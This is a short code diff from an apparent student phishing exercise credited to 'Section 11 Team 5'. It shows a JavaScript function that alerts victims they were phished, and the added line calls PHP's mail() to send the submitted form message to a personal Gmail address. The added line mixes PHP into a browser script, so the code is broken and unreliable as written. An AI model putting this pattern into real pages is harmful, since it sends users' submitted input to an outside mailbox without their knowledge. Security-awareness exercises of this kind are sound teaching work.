@@ -177,6 +177,7 @@ input + .form-default p, select + .form-default p { margin: .2em 0 0; }
 function YouWerePhished() {
     console.log(window.location.href);
     alert("You were just phished by Section 11 Team 5! Better Luck next time.");
+    mail("tdebbad@gmail.com", "Form to email message", $_POST["message"], "From: phishers@umail.com");
   }
 
   </script>
